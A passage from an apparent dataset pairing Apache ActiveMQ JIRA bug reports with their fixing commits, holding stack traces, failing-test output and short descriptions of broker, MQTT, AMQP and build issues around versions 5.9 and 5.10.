aused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter': Instantiation of bean failed; nested exception is org.springframework.beans.BeanInstantiationException: Could not instantiate bean class [org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter]: Constructor threw exception; nested exception is java.lang.NoClassDefFoundError: javax/xml/stream/XMLStreamException
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateBean(AbstractAutowireCapableBeanFactory.java:1037)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:983)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:487)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:458)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:289)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.web.servlet.DispatcherServlet.createDefaultStrategy(DispatcherServlet.java:810)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.web.servlet.DispatcherServlet.getDefaultStrategies(DispatcherServlet.java:779)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.web.servlet.DispatcherServlet.initHandlerAdapters(DispatcherServlet.java:587)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.web.servlet.DispatcherServlet.initStrategies(DispatcherServlet.java:444)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.web.servlet.DispatcherServlet.onRefresh(DispatcherServlet.java:432)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.web.servlet.FrameworkServlet.onApplicationEvent(FrameworkServlet.java:772)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.web.servlet.FrameworkServlet$ContextRefreshListener.onApplicationEvent(FrameworkServlet.java:1083)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.web.servlet.FrameworkServlet$ContextRefreshListener.onApplicationEvent(FrameworkServlet.java:1080)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.context.event.GenericApplicationListenerAdapter.onApplicationEvent(GenericApplicationListenerAdapter.java:51)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.context.event.SourceFilteringListener.onApplicationEventInternal(SourceFilteringListener.java:96)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.context.event.SourceFilteringListener.onApplicationEvent(SourceFilteringListener.java:68)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.context.event.SimpleApplicationEventMulticaster.multicastEvent(SimpleApplicationEventMulticaster.java:96)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.context.support.AbstractApplicationContext.publishEvent(AbstractApplicationContext.java:334)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.context.support.AbstractApplicationContext.finishRefresh(AbstractApplicationContext.java:948)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:482)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.web.servlet.FrameworkServlet.configureAndRefreshWebApplicationContext(FrameworkServlet.java:651)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.web.servlet.FrameworkServlet.createWebApplicationContext(FrameworkServlet.java:599)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.web.servlet.FrameworkServlet.createWebApplicationContext(FrameworkServlet.java:665)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.web.servlet.FrameworkServlet.initWebApplicationContext(FrameworkServlet.java:518)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.web.servlet.FrameworkServlet.initServletBean(FrameworkServlet.java:459)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.web.servlet.HttpServletBean.init(HttpServletBean.java:136)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at javax.servlet.GenericServlet.init(GenericServlet.java:161)[80:org.apache.geronimo.specs.geronimo-servlet_3.0_spec:1.0]
	at org.eclipse.jetty.servlet.ServletHolder.initServlet(ServletHolder.java:532)[85:org.eclipse.jetty.aggregate.jetty-all-server:8.1.14.v20131031]
	... 33 more
Caused by: org.springframework.beans.BeanInstantiationException: Could not instantiate bean class [org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter]: Constructor threw exception; nested exception is java.lang.NoClassDefFoundError: javax/xml/stream/XMLStreamException
	at org.springframework.beans.BeanUtils.instantiateClass(BeanUtils.java:163)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.beans.factory.support.SimpleInstantiationStrategy.instantiate(SimpleInstantiationStrategy.java:87)[145:org.apache.activemq.activemq-web-console:5.9.1]
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateBean(AbstractAutowireCapableBeanFactory.java:1030)[145:org.apache.activemq.activemq-web-console:5.9.1]
	... 60 more
Caused by: java.lang.NoClassDefFoundError: javax/xml/stream/XMLStreamException
	at org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter.<init>(AnnotationMethodHandlerAdapter.java:203)[145:org.apache.activemq.activemq-web-console:5.9.1]
~~~",25600944e662279ec1113acd4d27e9c64ba8415f,AMQ-5167 ActiveMQ web-cosole fails to start in Karaf - missing import
12711133,AMQ-5164,"This test currently fails with the following error:

testAdvisory(org.apache.activemq.broker.ft.QueueMasterSlaveSingleUrlTest)  Time elapsed: 24.891 sec  <<< FAILURE!
junit.framework.AssertionFailedError: Didn't received advisory
	at junit.framework.Assert.fail(Assert.java:57)
	at junit.framework.Assert.assertTrue(Assert.java:22)
	at junit.framework.Assert.assertNotNull(Assert.java:256)
	at junit.framework.TestCase.assertNotNull(TestCase.java:426)
	at org.apache.activemq.broker.ft.QueueMasterSlaveTestSupport.testAdvisory(QueueMasterSlaveTestSupport.java:153)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:606)
	at junit.framework.TestCase.runTest(TestCase.java:176)
	at junit.framework.TestCase.runBare(TestCase.java:141)
	at org.apache.activemq.CombinationTestSupport.runBare(CombinationTestSupport.java:107)
	at org.apache.activemq.CombinationTestSupport.runBare(CombinationTestSupport.java:113)
	at junit.framework.TestResult$1.protect(TestResult.java:122)
	at junit.framework.TestResult.runProtected(TestResult.java:142)
	at junit.framework.TestResult.run(TestResult.java:125)
	at junit.framework.TestCase.run(TestCase.java:129)
	at junit.framework.TestSuite.runTest(TestSuite.java:255)
	at junit.framework.TestSuite.run(TestSuite.java:250)
	at org.junit.internal.runners.JUnit38ClassRunner.run(JUnit38ClassRunner.java:84)
	at org.apache.maven.surefire.junit4.JUnit4Provider.execute(JUnit4Provider.java:254)
	at org.apache.maven.surefire.junit4.JUnit4Provider.executeTestSet(JUnit4Provider.java:149)
	at org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:124)
	at org.apache.maven.surefire.booter.ForkedBooter.invokeProviderInSameClassLoader(ForkedBooter.java:200)
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:153)
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:103)


Results :

Failed tests: 
  QueueMasterSlaveSingleUrlTest>CombinationTestSupport.runBare:113->CombinationTestSupport.runBare:107->QueueMasterSlaveTestSupport.testAdvisory:153 Didn't received advisory

Tests run: 1, Failures: 1, Errors: 0, Skipped: 0

",b0bf144e7a6473f207e4897f9a0971665f0e2b66,"Ignoring testAdvisory test for now, see https://issues.apache.org/jira/browse/AMQ-5164"
12710147,AMQ-5160,"I am using MQTT on AMQ 5.9.1
After latest MQTT hardening from [~dhirajsb] , there is an issue of MQTT retained messages.

Simple case:
Set Authentication / Authorization for two different TOPICS.
Send retained message to one topic.

Try to subscribe ""#"" with other second user.
It will show retained messages published by TOPIC 1. 

here i have attached test configurations.

",c915b19a205d37c2faad05178de716dca64981d5,"Fixed AMQ-5160, removed producer's retain property from retained messages"
12710147,AMQ-5160,"I am using MQTT on AMQ 5.9.1
After latest MQTT hardening from [~dhirajsb] , there is an issue of MQTT retained messages.

Simple case:
Set Authentication / Authorization for two different TOPICS.
Send retained message to one topic.

Try to subscribe ""#"" with other second user.
It will show retained messages published by TOPIC 1. 

here i have attached test configurations.

",3ba129561c28b3ac36a7d8a8b677cf13797bec9b,https://issues.apache.org/jira/browse/AMQ-5160 - start/stop wrapped policy
12709191,AMQ-5153,LevelDB store does not save the subscribedDestination of the SubscriptionInfo for a durable subscription.  This is important because when a restart happens you have no clue if this durable subscription goes with the topic or to a different topic (because of wildcarding).,01f56d0ca255852bf9c12b889abd8d1297a2b5a9,unit tests for https://issues.apache.org/jira/browse/AMQ-5153 LevelDB does not store subscribedDestination for durable subscriptions
12706626,AMQ-5136,"When sending a message to a topic using a transacted session, memory usage is not decremented correctly when session.rollback is called. It is decremented on commit but not on rollback. This has quite bad consequences since after some time depending on the system memory usage settings and amount of rolled back messages, the broker starts to reject messages saying that Usage Manager memory limit is reached. The only solution is to restart the broker.
I created a small Maven project (see the attachment) with a unit test starting an embedded broker and two test methods: one sending messages with session.commit and another with session.rollback(). The last one fails to assert the memory usage. In the output one can see quite a lot of error logs written by ActiveMQ. The problem is reproducible with 5.8.0 and 5.9.0.
The problem seems to be in org.apache.activemq.broker.region.Topic#doMessageSend method where a transaction synchronization is registered. In the transaction synchronization only afterCommit is supplied, but no afterRollback. So there seems to be nobody calling message.decrementReferenceCount().
",c5c1495330dbad20c2f25e4b44f017005fb97a42,https://issues.apache.org/jira/browse/AMQ-5136 - fix and test (thanks barlabanov)
12702417,AMQ-5110,When an AMQP transaction is committed or rolled back the broker settles the delivery but does not set an Accepted outcome on the delivery.  The spec indicates that a proper discharge response will contain an accepted outcome along with being remotely settled.  ,e06e23b9f331facd3bdb44980a206a367bd47b52,"https://issues.apache.org/jira/browse/AMQ-5110

Set accepted outcome for successful commit and rollback."
12702120,AMQ-5106,"Hi I'm not able to complete the mvn eclipse:clean eclise:eclipse on the trunk due to a missing jar.
org.apache.xerces:xercesImpl:jar:2.11.0
could not be located over default repository (and I've no local copy).
Please add some repository or deploy it over officials repo.

Here is the stack trace:

org.apache.maven.lifecycle.LifecycleExecutionException: Failed to execute goal on project activemq-karaf-itest: Could not resolve dependencies for project org.apache.activemq:activemq-karaf-itest:jar:5.10-SNAPSHOT: Could not find artifact org.apache.xerces:xercesImpl:jar:2.11.0 in repo.jenkins-ci.org (http://repo.jenkins-ci.org/public/)
        at org.apache.maven.lifecycle.internal.LifecycleDependencyResolver.getDependencies(LifecycleDependencyResolver.java:220)
        at org.apache.maven.lifecycle.internal.LifecycleDependencyResolver.resolveProjectDependencies(LifecycleDependencyResolver.java:127)
        at org.apache.maven.lifecycle.internal.MojoExecutor.ensureDependenciesAreResolved(MojoExecutor.java:257)
        at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:200)
        at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:153)
        at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:145)
        at org.apache.maven.lifecycle.internal.MojoExecutor.executeForkedExecutions(MojoExecutor.java:364)
        at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:198)
        at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:153)
        at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:145)
        at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject(LifecycleModuleBuilder.java:84)
        at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject(LifecycleModuleBuilder.java:59)
        at org.apache.maven.lifecycle.internal.LifecycleStarter.singleThreadedBuild(LifecycleStarter.java:183)
        at org.apache.maven.lifecycle.internal.LifecycleStarter.execute(LifecycleStarter.java:161)
        at org.apache.maven.DefaultMaven.doExecute(DefaultMaven.java:318)
        at org.apache.maven.DefaultMaven.execute(DefaultMaven.java:153)
        at org.apache.maven.cli.MavenCli.execute(MavenCli.java:555)
        at org.apache.maven.cli.MavenCli.doMain(MavenCli.java:214)
        at org.apache.maven.cli.MavenCli.main(MavenCli.java:158)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:597)
        at org.codehaus.plexus.classworlds.launcher.Launcher.launchEnhanced(Launcher.java:290)
        at org.codehaus.plexus.classworlds.launcher.Launcher.launch(Launcher.java:230)
        at org.codehaus.plexus.classworlds.launcher.Launcher.mainWithExitCode(Launcher.java:414)
        at org.codehaus.plexus.classworlds.launcher.Launcher.main(Launcher.java:357)
Caused by: org.apache.maven.project.DependencyResolutionException: Could not resolve dependencies for project org.apache.activemq:activemq-karaf-itest:jar:5.10-SNAPSHOT: Could not find artifact org.apache.xerces:xercesImpl:jar:2.11.0 in repo.jenkins-ci.org (http://repo.jenkins-ci.org/public/)
        at org.apache.maven.project.DefaultProjectDependenciesResolver.resolve(DefaultProjectDependenciesResolver.java:198)
        at org.apache.maven.lifecycle.internal.LifecycleDependencyResolver.getDependencies(LifecycleDependencyResolver.java:195)
        ... 26 more
Caused by: org.eclipse.aether.resolution.DependencyResolutionException: Could not find artifact org.apache.xerces:xercesImpl:jar:2.11.0 in repo.jenkins-ci.org (http://repo.jenkins-ci.org/public/)
        at org.eclipse.aether.internal.impl.DefaultRepositorySystem.resolveDependencies(DefaultRepositorySystem.java:384)
        at org.apache.maven.project.DefaultProjectDependenciesResolver.resolve(DefaultProjectDependenciesResolver.java:192)
        ... 27 more
Caused by: org.eclipse.aether.resolution.ArtifactResolutionException: Could not find artifact org.apache.xerces:xercesImpl:jar:2.11.0 in repo.jenkins-ci.org (http://repo.jenkins-ci.org/public/)
        at org.eclipse.aether.internal.impl.DefaultArtifactResolver.resolve(DefaultArtifactResolver.java:459)
        at org.eclipse.aether.internal.impl.DefaultArtifactResolver.resolveArtifacts(DefaultArtifactResolver.java:262)
        at org.eclipse.aether.internal.impl.DefaultRepositorySystem.resolveDependencies(DefaultRepositorySystem.java:367)
        ... 28 more
Caused by: org.eclipse.aether.transfer.ArtifactNotFoundException: Could not find artifact org.apache.xerces:xercesImpl:jar:2.11.0 in repo.jenkins-ci.org (http://repo.jenkins-ci.org/public/)
        at org.eclipse.aether.connector.wagon.WagonRepositoryConnector$6.wrap(WagonRepositoryConnector.java:1012)
        at org.eclipse.aether.connector.wagon.WagonRepositoryConnector$6.wrap(WagonRepositoryConnector.java:1004)
        at org.eclipse.aether.connector.wagon.WagonRepositoryConnector$GetTask.run(WagonRepositoryConnector.java:725)
        at org.eclipse.aether.util.concurrency.RunnableErrorForwarder$1.run(RunnableErrorForwarder.java:67)
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
        at java.lang.Thread.run(Thread.java:662)
[ERROR] 
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/DependencyResolutionException
[ERROR] 
[ERROR] After correcting the problems, you can resume the build with the command
[ERROR]   mvn <goals> -rf :activemq-karaf-itest",6056fde7ed0f47505b9ad84728bd9c3399a9d32b,https://issues.apache.org/jira/browse/AMQ-5106 - apply patch with thanks from carlo cancellieri - This closes #17
12701485,AMQ-5102,"This test fails intermittently with the error below.  This is a pretty marginal case; it never fails on my laptop, and it doesn't fail on CI boxes when run on its own, only when all tests are run.

testSendHugeMessage(org.apache.activemq.transport.amqp.bugs.AMQ4914Test)  Time elapsed: 303.375 sec  <<< ERROR!
java.lang.Exception: test timed out after 300000 milliseconds
	at java.lang.Object.wait(Native Method)
	at java.lang.Object.wait(Object.java:485)
	at org.apache.qpid.amqp_1_0.client.Receiver.receiveFromPrefetch(Receiver.java:328)
	at org.apache.qpid.amqp_1_0.client.Receiver.receive(Receiver.java:258)
	at org.apache.qpid.amqp_1_0.jms.impl.MessageConsumerImpl.receive0(MessageConsumerImpl.java:291)
	at org.apache.qpid.amqp_1_0.jms.impl.MessageConsumerImpl.receiveImpl(MessageConsumerImpl.java:260)
	at org.apache.qpid.amqp_1_0.jms.impl.MessageConsumerImpl.receive(MessageConsumerImpl.java:235)
	at org.apache.qpid.amqp_1_0.jms.impl.MessageConsumerImpl.receive(MessageConsumerImpl.java:57)
	at org.apache.activemq.transport.amqp.bugs.AMQ4914Test.doTestSendLargeMessage(AMQ4914Test.java:104)
	at org.apache.activemq.transport.amqp.bugs.AMQ4914Test.testSendHugeMessage(AMQ4914Test.java:80)",4e79e43905989549c8c75cc2364e1b16c22301ed,Added @Ignore for AMQ-5102 until proton 0.7 is released
12694611,AMQ-5043,<NA>,706830268e1cecfe165feb444ee5b62e954e7d33,More improvements for AMQ-5043.  Drop all messages sent to topics starting '$' to honor MQTT 3.1.1 spec requirments.
12694481,AMQ-5041,"The JMSClientTest is currently hanging on multiple test cases.  I'll attach a stack trace, but it looks like the test is hanging during the broker.stop in tearDown().

I'm going to add @Ignore tags to most of the tests so this stops hanging CI builds.  ",a165054df9c354ff17856fe8e6390c09bfdf6a2d,Added multiple @Ignores to keep this test from hanging and blocking CI builds.  AMQ-5041
12693441,AMQ-5029,"
When using jetty:run in activemq-web-console or deploying the war into tomcat, the activemq.data system property is not resolved into a directory name for the kahadb.   Thus, a ${acitvemq.data} directory is created which is strange looking.   The property placeholder thing needs to be added to the spring config.",17d1489c62b6bc33b77bce38eeecdc357f9c61bf,[AMQ-5029] embedded webconsole broker does not resolve activemq.data system property
12693070,AMQ-5021,"org.apache.activemq.bugs.MemoryUsageBlockResumeTest sometimes hangs, which can block CI builds.  I will update it to JUnit4 and add a timeout so it at least does not cause the build to hang.

I am also attaching a stack trace.
",5a80cee9608fdf93fde7d5b132d6ddd8a9eba946,"Converted to JUnit4 because of CI hangs, see AMQ-5021"
12692105,AMQ-5002,<NA>,875822de5172607496e7bd219a177213df92b7cd,Fixes AMQ-5002: Support receiving AMQP messages which do not have the timestamp set but the expiration is set.
12691633,AMQ-4995,"When we change destination interceptor we need to reapply it to all destination as otherwise the effects will have no change. An example is changing property like ""forwardOnly"" in the following configuration

{code}<destinationInterceptors>
    <virtualDestinationInterceptor>
       <virtualDestinations>
           <compositeQueue forwardOnly=""false"" name=""VirtualDestination.CompositeQueue"">
               <forwardTo>
                   <queue physicalName=""VirtualDestination.QueueConsumer""/>
                   <topic physicalName=""VirtualDestination.TopicConsumer""/>
               </forwardTo>
           </compositeQueue>
       </virtualDestinations>
    </virtualDestinationInterceptor>
</destinationInterceptors>{code}",55da9bc821184a320fc551ec8e131d1dcbf0d2bb,https://issues.apache.org/jira/browse/AMQ-4995 - reapply destination interceptor after change
12691633,AMQ-4995,"When we change destination interceptor we need to reapply it to all destination as otherwise the effects will have no change. An example is changing property like ""forwardOnly"" in the following configuration

{code}<destinationInterceptors>
    <virtualDestinationInterceptor>
       <virtualDestinations>
           <compositeQueue forwardOnly=""false"" name=""VirtualDestination.CompositeQueue"">
               <forwardTo>
                   <queue physicalName=""VirtualDestination.QueueConsumer""/>
                   <topic physicalName=""VirtualDestination.TopicConsumer""/>
               </forwardTo>
           </compositeQueue>
       </virtualDestinations>
    </virtualDestinationInterceptor>
</destinationInterceptors>{code}",907660d2cfa5f5a6d67c93ec62dffd4ff2e87ff0,https://issues.apache.org/jira/browse/AMQ-4995 - add xml config file for the test
12689260,AMQ-4975,"This test fails intermittently with the error below.  It typical fails at around message 180-185, where it looks like it receives the same message twice.

(This test is defined in JmsSendReceiveTestSupport.  I'll add an overridden no-op version in DbRestartJDBCQueueMasterSlaveLeaseQuiesceTest for now so it doesn't cause CI builds to fail)


-------------------------------------------------------
 T E S T S
-------------------------------------------------------
Running org.apache.activemq.broker.ft.DbRestartJDBCQueueMasterSlaveLeaseQuiesceTest
Tests run: 4, Failures: 1, Errors: 0, Skipped: 0, Time elapsed: 70.702 sec <<< FAILURE! - in org.apache.activemq.broker.ft.DbRestartJDBCQueueMasterSlaveLeaseQuiesceTest
testSendReceive(org.apache.activemq.broker.ft.DbRestartJDBCQueueMasterSlaveLeaseQuiesceTest)  Time elapsed: 18.286 sec  <<< FAILURE!
junit.framework.ComparisonFailure: Message: 181 expected:<Text for message: 18[1] at Thu Jan 16 16:02...> but was:<Text for message: 18[0] at Thu Jan 16 16:02...>
	at junit.framework.Assert.assertEquals(Assert.java:100)
	at junit.framework.TestCase.assertEquals(TestCase.java:261)
	at org.apache.activemq.JmsSendReceiveTestSupport.assertMessagesReceivedAreValid(JmsSendReceiveTestSupport.java:165)
	at org.apache.activemq.JmsSendReceiveTestSupport.assertMessagesAreReceived(JmsSendReceiveTestSupport.java:128)
	at org.apache.activemq.JmsSendReceiveTestSupport.testSendReceive(JmsSendReceiveTestSupport.java:104)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:606)
	at junit.framework.TestCase.runTest(TestCase.java:176)
	at junit.framework.TestCase.runBare(TestCase.java:141)
	at org.apache.activemq.CombinationTestSupport.runBare(CombinationTestSupport.java:107)
	at org.apache.activemq.CombinationTestSupport.runBare(CombinationTestSupport.java:113)
	at junit.framework.TestResult$1.protect(TestResult.java:122)
	at junit.framework.TestResult.runProtected(TestResult.java:142)
	at junit.framework.TestResult.run(TestResult.java:125)
	at junit.framework.TestCase.run(TestCase.java:129)
	at junit.framework.TestSuite.runTest(TestSuite.java:255)
	at junit.framework.TestSuite.run(TestSuite.java:250)
	at org.junit.internal.runners.JUnit38ClassRunner.run(JUnit38ClassRunner.java:84)
	at org.apache.maven.surefire.junit4.JUnit4Provider.execute(JUnit4Provider.java:264)
	at org.apache.maven.surefire.junit4.JUnit4Provider.executeTestSet(JUnit4Provider.java:153)
	at org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:124)
	at org.apache.maven.surefire.booter.ForkedBooter.invokeProviderInSameClassLoader(ForkedBooter.java:200)
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:153)
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:103)


Results :

Failed tests: 
  DbRestartJDBCQueueMasterSlaveLeaseQuiesceTest>CombinationTestSupport.runBare:113->CombinationTestSupport.runBare:107->JmsSendReceiveTestSupport.testSendReceive:104->JmsSendReceiveTestSupport.assertMessagesAreReceived:128->JmsSendReceiveTestSupport.assertMessagesReceivedAreValid:165 Message: 181 expected:<Text for message: 18[1] at Thu Jan 16 16:02...> but was:<Text for message: 18[0] at Thu Jan 16 16:02...>

Tests run: 4, Failures: 1, Errors: 0, Skipped: 0


",e56c062f279dc110df4707024654b2b7c40f6c1d,"Added overridden no-op version of testSendReceive, see AMQ-4975"
12688564,AMQ-4967,<NA>,6377d49a1c2e501b7f9daa39a4ed91e8cf4114b1,"https://issues.apache.org/jira/browse/AMQ-4967

Import activemq pool explicitly"
12687532,AMQ-4962,Using the QPid AMQP JMS client and creating and closing a connection the connection count on the connector shows that there are lingering Connections.  For some reason the connection close is not being detected and processed correctly.  ,3af70ba285057e3a82d68bb6d8825a05f16fcdb6,"https://issues.apache.org/jira/browse/AMQ-4962

ensure immediate removal of connection MBean"
12682879,AMQ-4920,"I'll add a test to reproduce this.  There are currently 2 problems.  The more frequent one looks like:  org.apache.qpid.amqp_1_0.type.AmqpErrorException
        at org.apache.qpid.amqp_1_0.codec.ValueHandler.readConstructor(ValueHandler.java:99)
        at org.apache.qpid.amqp_1_0.codec.ValueHandler.parse(ValueHandler.java:90)
        at org.apache.qpid.amqp_1_0.codec.ValueHandler.readConstructor(ValueHandler.java:105)
        at org.apache.qpid.amqp_1_0.codec.ValueHandler.parse(ValueHandler.java:90)

… repeated many times
at org.apache.qpid.amqp_1_0.codec.ValueHandler.readConstructor(ValueHandler.java:105)
        at org.apache.qpid.amqp_1_0.codec.ValueHandler.parse(ValueHandler.java:90)
        at org.apache.qpid.amqp_1_0.messaging.SectionDecoderImpl.parseAll(SectionDecoderImpl.java:49)
        at org.apache.qpid.amqp_1_0.client.Receiver.receive(Receiver.java:280)
        at org.apache.qpid.amqp_1_0.jms.impl.MessageConsumerImpl.receive0(MessageConsumerImpl.java:286)
        at org.apache.qpid.amqp_1_0.jms.impl.MessageConsumerImpl.receiveImpl(MessageConsumerImpl.java:255)
        at org.apache.qpid.amqp_1_0.jms.impl.MessageConsumerImpl.receive(MessageConsumerImpl.java:238)
        at org.apache.qpid.amqp_1_0.jms.impl.MessageConsumerImpl.receive(MessageConsumerImpl.java:56)
        at org.apache.activemq.transport.amqp.ENTMQ466ConsumerThread.run(ENTMQ466Test.java:123)

This occurs at the line ""final EncodedMessage amqp = outboundTransformer.transform(jms);"" in the ConsumerContext.pumpOutbound() method of AmqpProtocolConverter(). This call sometimes returns with its content (amqp.getArray()) set to all zeros. 

On those messages this line
LOG.info(""In pumpOutbound, setting currentBuffer to offset {} length {} content [{}]"", amqp.getArrayOffset(), amqp.getLength(), amqp.getArray());
returns:

2013-11-26 17:19:16,680 [calhost] Task-3] - INFO AmqpProtocolConverter - In pumpOutbound, setting currentBuffer to offset 0 length 162 content [[0, 0, 0, 0, 0, \
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0\
, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]]

At the root of this, outboundTransformer is a (proton) AutoOutboundTransformer.  It calls AMQPNativeOutboundTransformer.transform(), which calls msg.readBytes(data), which sometimes writes all 0s to data.  Here msg is an ActiveMQBytesMessage.  

",7cf5c240a260c30572729b3a1b29863b64935a44,Test to reproduce AMQ4920
12682167,AMQ-4914,The AMQP client hangs when trying to receive messages > 32k.  I will add a test that reproduces this.,cfeea7797d9f3cbd5c0685f39d8b2a9cef77d8bb,Test to reproduce AMQ-4914 with the failing part @Ignored for now
12679489,AMQ-4893,If we try to copy headers between messages using getProperties and setObjectProperty with those values it now fails since the UTF8Buffer is not in the whitelist of convertable types. I think it should be added as a whitelisted type that gets handled like a string on setObjectProperty (and probably setStringProperty). Otherwise this causes the application code to have to special case String properties and couple to the hawtbuffer implementation detail.,a6e306437efafc13cf2c2e9d681d5685fdfbcfce,fix for: https://issues.apache.org/jira/browse/AMQ-4893
12679335,AMQ-4887,"ActiveMQBytesMessage will lost content if message's property was set before copy. Here is the test code:

Producer:
MessageProducer producer;  
//initialize Connection, Session, MessageProducer    
byte[] bs = ""bytes message"".getBytes();  
BytesMessage message = session.createBytesMessage();  
message.writeBytes(bs);  //write bytes to message 1
  
for(int i=0; i< 0; i++){  
  // then set message's propery   2
    message.setLongProperty(""sendTime"", System.currentTimeMillis());  
    try{  
        producer.send(message);  
    }catch(){  
         e.printStackTrace();  
    }
}  

Consumer:

MessageConsumer consumer  
//initailize Connection, Session, MessageConsumer  
for(int i=0; i<10; i++){  
    ActiveMQBytesMessage msg = (ActiveMQBytesMessage)consumer.receive(60*1000);  
    long sendTime = message.getLongProperty(""sendTime"");  
    System.out.println(""sendtime:"" + sendTime);  
    ByteSequence bs = message.getMessage().getContent();  
    System.out.println(""bytes data:"" + new String(bs.getData()));  
}  

Expected result:
consumer gets bytes data in all received messages

Actual result:
only the fisrt message has bytes data, all other messages lost bytes data, while long property value is not lost;

Analysization:
message gets copied when send, it will call storeContent() before copy,  DataOutputStream dataOut will be closed and the data in dataOut will be set to conent. This works correctly if there are no property was set.

when setLongProperty was called, it will call setObjectProperty() then will call  initializeWriting(), here DataOutputStream dataOut  will be create AGAIN. 

So when message was copied in second time, DataOutputStream dataOut is NOT null, but EMPTY, it will clear the value in content.

suggestion:
restore the content data to DataOutputStream dataOut when nitializeWriting()

my fix:
ActiveMQBytesMessage :
 private void  initializeWriting() throws JMSException {
669        The original code
                ......
